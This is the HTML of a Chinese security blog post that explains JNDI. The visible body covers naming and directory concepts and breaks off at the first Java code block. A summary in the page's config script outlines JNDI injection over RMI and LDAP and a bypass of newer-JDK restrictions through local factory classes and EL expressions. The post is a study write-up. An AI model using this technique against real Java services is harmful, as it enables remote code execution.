<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>JNDIRe0 | stoocea</title><meta name="author" content="stoocea"><meta name="copyright" content="stoocea"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="JNDIRe0"><meta name="application-name" content="JNDIRe0"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="JNDIRe0"><meta property="og:url" content="http://example.com/post/JNDIRe0.html"><meta property="og:site_name" content="stoocea"><meta property="og:description" content="什么是 JNDI英文全写为：Java Naming and Directory Interface，翻译叫做 JAVA 命名和目录接口，是 sun 公司提供的一种标准的	java 命令系统接口，JNDI 提供统一的客户端 API,并由管理者将服务端映射为 JNDI 上的特定服务和对象，简单来说就是："><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://bu.dusays.com/2024/03/08/65ea7ca64ea9f.png"><meta property="article:author" content="stoocea"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://bu.dusays.com/2024/03/08/65ea7ca64ea9f.png"><meta name="description" content="什么是 JNDI英文全写为：Java Naming and Directory Interface，翻译叫做 JAVA 命名和目录接口，是 sun 公司提供的一种标准的	java 命令系统接口，JNDI 提供统一的客户端 API,并由管理者将服务端映射为 JNDI 上的特定服务和对象，简单来说就是："><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://example.com/post/JNDIRe0"><link rel="preconnect" href="//cdn.cbd.int"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  linkPageTop: undefined,
  peoplecanvas: {"enable":true,"img":"https://upload-bbs.miyoushe.com/upload/2023/09/03/125766904/ee23df8517f3c3e3efc4145658269c06_5714860933110284659.png"},
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
  LA51: undefined,
  greetingBox: undefined,
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: false,
  mainTone: undefined,
  authorStatus: undefined,
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: undefined,
  highlight: {"plugin":"prismjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    simplehomepage: true,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: stoocea","link":"链接: ","source":"来源: stoocea","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'stoocea',
  title: 'JNDIRe0',
  postAI: '',
  pageFillDescription: '什么是 JNDI, 0x01 Naming 命名服务, 0x02 Directory 目录服务, 0x03 JNDI SPI, JNDI 代码实现, 0x01 JNDI_RMI 实现, JNDI 工作流程, 0x01 context 初始化和对应属性设置, 0x02 JNDI 底层实现, 1x01 获取 contect 的 factor 构造类, 1x02 获取 context 内容, JNDI 动态协议转化, 0x01 动态协议转化流程分析, JNDI-Refernce 类, JNDI 注入, 0x01 JNDI+RMI, 1x01 流程分析, 0x02 踩坑实录, 0x03 JNDI+LDAP, 0x01 什么是 LDAP, 0x02 JNDI+LDAP 攻击实现, 1x01 攻击流程分析, JNDI 注入高版本绕过, 0x01 JNDI-RMI 限制, 1x01 源码分析, 0x02 JNDI-LDAP 限制, 0x03 绕过实现分析, 1x03 代码实现, 1x04 流程分析, 总结什么是英文全写为翻译叫做命名和目录接口是公司提供的一种标准的命令系统接口提供统一的客户端并由管理者将服务端映射为上的特定服务和对象简单来说就是能够让用户通过统一的方式访问获取网络上的各种资源和服务键值对找东西和命名服务提供一种由键值对构成的通过名称来查找实际对象的服务比如协议就是客户端通过注册中心上的对象名称得到远程对象的引用有几个名词需要解释一下表示一个名称和对应对象的绑定关系也就是域名绑定到对应上中一个远程对象去绑定一个名称表示一组名称和对应对象的绑定比如中的容器里面就存在和各种的对应关系中的等在一个实际的对象存储键值对中有些对象他并不能直接存储在系统中这个时候就需要引用来代表这个对象而一个引用中必须要包含该实际对象的信息运作状态等等最形象的是文件系统中的我们实际对文件的操作是内容通过这个找到磁盘中对应位置和读写偏移的目录服务目录服务相当于命名服务的一个扩展一个键值对的信息服务中实际对象还能够拥有对应的属性信息那我们进行查找操作的时候就不止通过名称去查找还可以通过属性值去查找架构如下层次由上往下我们最终接触到的部分是主要是为底层的具体目录服务提供统一的接口从而实现目录服务的可插拔式的安装从这种图就能看出原生的有如下服务远程方法调用轻量级目录访问协议通用对象请求代理架构用于名称服务域名转换协议代码实现主要分为如下几个包主要用于命名操作它包含了命名服务的类和接口该包定义了接口和类主要用于目录操作它定义了接口和类在命名目录服务器中请求事件通知提供服务支持允许动态插入不同实现为不同命名目录服务供应商的开发人员提供开发和实现的途径以便应用程序通过可以访问相关服务开始代码的具体实现实现先写的服务端远程对象接口远程对象服务端逻辑端正在运行启动服务然后我们用的接口去调远程对象调用结果如下稍微分析一下实现端的逻辑我们通过设置环境变量指定了要从哪获取对象也就是端口上的注册中心然后就调用创建出来的的即可那么是如何识别我们指定的服务以及如何定位到服务中心的工作流程初始化和对应属性设置我们之前提到过的整体架构最近的一层是的层他是我们能够接触到的最直接的然后我们看的导包结构他导入了下的服务而本身的作用主要是为底层的具体目录服务提供统一的接口从而能够使得目录服务的可插拔安装这正好对应为什么要获取与正是为了满足这一条件能够让能够正常获取到我们想要指定的服务名称能够让初始化出来的定位到服务位置这其实跟之前获取到服务中心的流程很像而其实是隶属于的所以操作步骤也是差不多的除了这么一个通过传值初始化的方法还有其他两种方法第一个是选择不初始化直接调用方法从环境变量中获取属性值实现如下设置环境变量初始化上下文的功能点其实和差不多底层实现获取的构造类我们把断点打在初始化的地方然后继续跟进在方法中首先是获取环境变量也就是当前系统以及我们刚才设置的的环境变量然后跟进方法最终跟进到的方法首先获取到的工厂类如果为空就直接获取属性作为我们的工厂类那这里就是我们刚才通过设置的了然后继续往下通过动态加载工厂类最后调用的方法整理一下调用类这个是中的一个属性值专门用来动态实例化类事后继续翻阅流程的时候也在最终返回的方法中发现实现了这个方法的类就那么几个也就是服务种类的那些获取内容继续跟进的的方法这里的就是我们自己传的那个变量作为的参数值跟进分析逻辑这里是类所以如果为空他默认是返回协议头但是没有解析这里我们肯定不为空所以就直接返回继续跟进外层的开始调用的方法这里会判断我们的是否为空之后跟进很奇怪这里会直接调用的方法但是此时等相关配置还未装配继续跟进看看逻辑由于本身是不带方法所以直接到父类的方法这里第一部逻辑就是执行方法获取解析结果这里的结果如下结果封装成了对象通过方法取出之后调用的方法这里会因为我们传值的通过方法返回的结果为空所以不会继续下面的直接调用的方法而是返回当前的上述逻辑比较重要因为可能刚才流程师傅们在学习的时候会很好奇为什么会进逻辑但是却没有返回查询结果我也不知道为什么在创建的时候会调那么这里返回之后会一路返回上去所以我们当前初始化的就是实例化对象再次调用其方法就是调用刚才的了总结一下调用栈下面代码部分的获取不涉及获取服务路径的部分到这就算是获取到了包含的对象后续就是进意思一下返回了其实能调的远程就存在攻击可能动态协议转化这次我们不往初始化里面丢自己写好的环境变量直接就往的里面写我们的定位发现依然能够查找到远程对象动态协议转化流程分析在处下个断点跟进发现在中不论是调哪种方法都是默认要走一层也就是我们最开始获取的构造类的流程相似跟进到具体内容由于这里我们没有所以不能够直接去调用不然就和上面的流程一样了往下先获取到也就是协议头带着进入方法继续跟进到方法这边根据属性动态生成类也就是说这个包下的类都是可以通过的动态协议转化生成的直到这里我相信师傅们应该能理解为什么要分别分析的正常通过获取环境变量设置去实例化获取和动态协议转化了动态协议转化使我们的攻击扩大了可能性以及攻击范围虽说的这种动态转化的功能很方便但是有方便并且参数可控就是我们可以攻击点假如我们可以控制字符串的输入就能够搭建恶意服务并控制接口访问该恶意于是将导致恶意的远程文件加载从而导致远程代码执行工厂类的动态加载类定义在最开始的提到过但是这里还要对其有一定的补充类表示对存在于命名目录系统以外的对象的引用什么意思呢就是当我们查询远程对象在服务中找不到时能够从其他远程端获取到文件加载并实例化类结构如下这里只列出一种构造方法还有其他三种构造方法依次递减构造参数由于的限制如果想要远程对象被访问到就必须继承所以这里我们需要使用类对类或其子类对象进行远程包装成类使其能够被远程访问注入先来张流程图和中远程从中获取恶意类加载的思路是差不多的我们这里只不过不是把换成了对象写一个简单的恶意客户端正在运行中这里必须用包装一下不然无法通过访问到然后写一下恶意工厂类必须继承类同样也是由于必须继承远程对象类才能被访问到所以这里必须继承远程工厂类之后写上受害者的信息成功弹出计算机流程分析其实上面对于的工作流程分析时就已经提到过了我们这里先确定一下大概的方向的动态协议转化导致我们能够从类中读取地址从恶意地址中获取恶意工厂类其实不用工厂类也行字节码内容然后本地实例化之后触发构造方法首先处下个断点来到的具体内容继续跟进方法由于我们传值中制定了协议所以这里的取出来是进入判断完毕之后的内容通过的的方法来获取内容里面只有一个方法继续跟进这里根据的值构造出了的构造实体那么之后就是根据工厂类来获取的内容了这里就直接返回到调用中去还是由于本身没有方法的定义跟进到的方法这里的方法和方法都都是为了获取此时的就是继续调用其方法到这里就已经获取到了中熟悉的从远程客户端上请求字节码了最后调用进行实例化这里持续跟进到调用进行动态类加载与之前实例化时不同的类不是在这里实例化虽然长得挺像的而是在的至于这里的逻辑就是区别在里面了看是走还是踩坑实录愚蠢的又在这里踩坑了目录结构尽量是直接在目录下不要在子包下写服务不然客户端启动的时候找不到这个恶意类我也不知道为什么可能寻找的地址要加点什么吧什么是首先回顾一下的定义轻型目录访问协议是一种目录服务协议运行在堆栈上它本身是由目录数据库和一套的目录访问协议构成的目录服务本身是一个特殊的数据库用来保存描述性的基于属性的详细信息拥有最基本的查询浏览以树状结构组织数据简单点说就是一个用来存储协议的数据库在中我们通过目录树来访问一条记录基本名词和结构如下一条记录的详细位置一条记录所属区域哪一颗树一条记录所属组织哪一个分支一条记录的名字哪一个苹果名字目录树的最顶部就是根也就是所谓的基准访问的深度依次从上往下的工作流程是不会变的如果我们可以控制去访问服务器上的恶意对象就能够达到和恶意对象同样的效果攻击实现先用上常用的服务器把服务搭上这里我用是首先一个新的服务然后在这个服务的基础上加上连接目录结构如下之后开始作用的代码实现先写一个服务端针对了所以不用去加去包装满足的要求了服务器正在运行中然后要注意恶意类的编写有所改变不是针对形式的攻击了这里的是所以不用去继承远程工厂类如果是测试的攻击请加上的继承然后是客户端实验没问题攻击流程分析其实整体和很相似只不过初步获取不同这里我们依然断点打在处直接进的先获取之后返回出去开始调用的方法跟进之后发现还是跟差不多调用父类的方法前面获取解析结果就不跟进了直接进它的但是本身是没有方法还是得调它的父类这里直接掉到了顶级父类的方法获取一堆信息然后直接进跟进最后又一直向下调用的跟进到最后熟悉的的了中跟进到之后就是动态类加载了注入高版本绕过限制之后限制了通过远程加载工厂类估计师傅们自己在测试的时候应该也遇到了这个问题也就是报错的默认值变为了即默认不允许通过从远程的加载工厂类源码分析相信经过上面的攻击流程分析师傅们应该可以确定的远程攻击进入开始阶段是在中对比和的源码不同多了一层对于类型的限制以及远程的检查基本上远程都不会被允许加载了所以我们得另辟蹊径首先加载本地的然后再利用这个本地的去加载远程类限制同样包下的也被默认值设置为了限制相同绕过方式也相同绕过实现分析我们以的绕过为前期绕过分析对象实际上两者共用一套绕过逻辑首先这个本地工厂类必须实现这是一直从注入开始利用类就满足的一个条件在写利用类的时候应该也发现如果实现就必须要实现方法然后这个工厂类实例化我们的恶意类的方法参数必须可控综合上面的条件在的依赖包中有一个满足前置的两个条件观察他的方法发现有一个限制我们实例化生产的类必须是类型不然无法进入方法的块处理逻辑什么是呢在或者项目中我们在中见的很多用来引入外部资源的而表达式其实就是元素表达式在中用来加载外部资源我们看看的具体定义和内容简单来说它也是一种引用也就是用来包装指定类的各类信息还包括了用来加载该类的工厂地址为什么是呢具体思考和这一套管理类的逻辑而且都是我们可控的这就很巧我们就是需要一个从本地加载类总结一下就是我们用包装一下和指定加载它的之后让去实例化调用的方法触发代码实现可以先写一个恶意服务端然后写一个受害者执行起来应该没有问题复现时要注意中的能不能直接加载类进行命令执行以及的依赖是否打上了流程分析断点依然是打在中但是这里我们就直接进了返回出来依然是逻辑照旧由于是的所以直接就跟进到的通过原生获取到字节码之后再调用方法关键性逻辑在第一句这里会判断我们传进来的要实例化的对象是否是类如果是的话那我们这个流程就肯定没有后续了因为它会将实例化对象强转为类型会自带属性字段后面的判断就过不去了这就是为什么我们要选择的原因继续往下来到最为关键的判断由于我们的指定实例化类是不带属性所以三个判断条件中第二个判断条件不符合要求与运算不通过可以开开心心进行类加载了那么直接跟进的方法首先对其强转为类然后直接通过获取到工厂类的全类名此时是调用先对它进行类加载然后开始调用工厂类的对类实现实例化加载这里稍微看一下变量表自然跟进到的方法调用获取到的全类名开一个当前线程的类加载器对进行类加载然后的内容就是对这个类中的设定的信息进行处理比如说获取到然后对其字符串处理满足表达式然后获取要执行方法的参数等等最后的最后获取到方法以及参数之后反射调用触发最终触发如下表达式其实是一种很常用的媒介初次完整分析很过瘾复习除了思路开拓和基础部分是跟文章分析部分都是自己去走逻辑去解决自己遇到的问题感觉很爽不会再去傻傻的跟着别人的步骤走了总结稍微总结一下的工作流程不论是不是动态协议转化都是一个总的逻辑为了获取到实例而去构造工厂类然后通过去实例化然后再去通过去调用各种方法如果是指定的属性调用的各种功能方法那么逻辑大致为如果是动态协议转化漏洞所在直接调方法比如那么他会先判断是哪种协议然后通过获取该协议相关的去构造该协议的再去调该协议的方法我们的漏洞分析也就是从这里开始的获取到相关协议相关协议调用相关方法如通过原生获取到远程服务器上的恶意字节码开始实例化本质还是通过工厂类去实例化调用工厂类的去完成高版本与低版本的区别就在此是否有对类型的限制以及默认是否为',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-03-11 11:15:28',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://bu.dusays.com/2024/03/08/65ea7ca64ea9f.png"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">stoocea</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/03/"><span class="card-archive-list-date">三月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">9</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="article-meta tags"></span></div></div><h1 class="post-title" itemprop="name headline">JNDIRe0</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2024-03-11T03:10:00.000Z" title="发表于 2024-03-11 11:10:00">2024-03-11</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-03-11T03:15:28.317Z" title="更新于 2024-03-11 11:15:28">2024-03-11</time></span></div><div class="meta-secondline"><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为长沙"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>长沙</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src="https://bu.dusays.com/2024/03/11/65ee76f777226.jpg"></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://example.com/post/JNDIRe0.html"><header><h1 id="CrawlerTitle" itemprop="name headline">JNDIRe0</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">stoocea</span><time itemprop="dateCreated datePublished" datetime="2024-03-11T03:10:00.000Z" title="发表于 2024-03-11 11:10:00">2024-03-11</time><time itemprop="dateCreated datePublished" datetime="2024-03-11T03:15:28.317Z" title="更新于 2024-03-11 11:15:28">2024-03-11</time></header><h1 id="什么是-JNDI"><a href="#什么是-JNDI" class="headerlink" title="什么是 JNDI"></a>什么是 JNDI</h1><p>英文全写为：<code>Java Naming and Directory Interface</code>，翻译叫做 JAVA 命名和目录接口，是 sun 公司提供的一种标准的	java 命令系统接口，JNDI 提供统一的客户端 API,并由管理者将服务端映射为 JNDI 上的特定服务和对象，简单来说就是： <strong>JNDI，能够让用户通过统一的方式访问获取网络上的各种资源和服务  （键值对找东西）</strong><br>Naming 和 Directroy</p>
<h2 id="0x01-Naming-命名服务"><a href="#0x01-Naming-命名服务" class="headerlink" title="0x01 Naming 命名服务"></a>0x01 Naming 命名服务</h2><p>提供一种由键值对构成的通过名称来查找实际对象的服务，比如 RMI 协议，就是客户端通过注册中心上的对象名称得到远程对象的引用，有几个名词需要解释一下</p>
<ul>
<li>Bindings：表示<strong>一个</strong>名称和对应对象的绑定关系，也就是 DNS 域名绑定到对应 IP 上，RMI 中一个远程对象去绑定一个名称</li>
<li>Context: 表示一组名称和对应对象的绑定，比如 spring 中的 IOC 容器，里面就存在 id 和各种 javabean 的对应关系，javaweb 中的 standardContext 等</li>
<li>References：在一个实际的对象存储键值对中，有些对象他并不能直接存储在系统中，这个时候就需要<code>References</code>（引用）来代表这个对象，而一个引用中必须要包含该实际对象的信息，运作状态等等。最形象的是 linux 文件系统中的 fd（ file descriptor ），我们实际对文件的操作是内容通过这个 fd 找到磁盘中对应位置和读写偏移的。</li>
</ul>
<h2 id="0x02-Directory-目录服务"><a href="#0x02-Directory-目录服务" class="headerlink" title="0x02 Directory 目录服务"></a>0x02 Directory 目录服务</h2><p>目录服务相当于命名服务的一个扩展，一个键值对的信息服务中，实际对象还能够拥有对应的属性（attributes）信息，那我们进行 lookup 查找操作的时候，就不止通过名称去查找，还可以通过属性值去查找</p>
<h2 id="0x03-JNDI-SPI"><a href="#0x03-JNDI-SPI" class="headerlink" title="0x03 JNDI SPI"></a>0x03 JNDI SPI</h2><p>JNDI 架构如下：<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1709878054437-6a112ecc-4601-4fa1-bb9f-c4252c6c5366.png#averageHue=%23be9b34&clientId=uc227c08e-913c-4&from=paste&height=386&id=u3507a37d&originHeight=579&originWidth=850&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=85892&status=done&style=none&taskId=u0885bb26-e3f5-4556-bfa0-2678f5f6d1c&title=&width=566.6666666666666" referrerpolicy="no-referrer" alt="l5qgw3jccj.png"><br>层次由上往下，我们最终接触到的 JDNI 部分是 SPI，SPI 主要是为底层的具体目录服务提供统一的接口，从而实现目录服务的可插拔式的安装<br>从这种图就能看出，JDK 原生的 JNDI 有如下服务：</p>
<ul>
<li>RMI: Java Remote Method Invocation，Java 远程方法调用</li>
<li>LDAP: 轻量级目录访问协议</li>
<li>CORBA: Common Object Request Broker Architecture，通用对象请求代理架构，用于 COS 名称服务(Common Object Services)</li>
<li>DNS（域名转换协议）</li>
</ul>
<h1 id="JNDI-代码实现"><a href="#JNDI-代码实现" class="headerlink" title="JNDI 代码实现"></a>JNDI 代码实现</h1><p>JNDI 主要分为如下几个包：</p>
<ul>
<li>javax.naming：主要用于命名操作，它包含了命名服务的类和接口，该包定义了Context接口和InitialContext类</li>
<li>javax.naming.directory：主要用于目录操作，它定义了DirContext接口和InitialDir-Context类</li>
<li>javax.naming.event：在命名目录服务器中请求事件通知</li>
<li>javax.naming.ldap：提供LDAP服务支持</li>
<li>javax.naming.spi：允许动态插入不同实现，为不同命名目录服务供应商的开发人员提供开发和实现的途径，以便应用程序通过JNDI可以访问相关服务</li>
</ul>
<p>开始代码的具体实现 </p>
<h3 id="0x01-JNDI-RMI-实现"><a href="#0x01-JNDI-RMI-实现" class="headerlink" title="0x01 JNDI_RMI 实现"></a>0x01 JNDI_RMI 实现</h3><p>先写 RMI 的服务端<br>远程对象接口：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">
<span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>stoocea</span><span class="token punctuation">;</span>

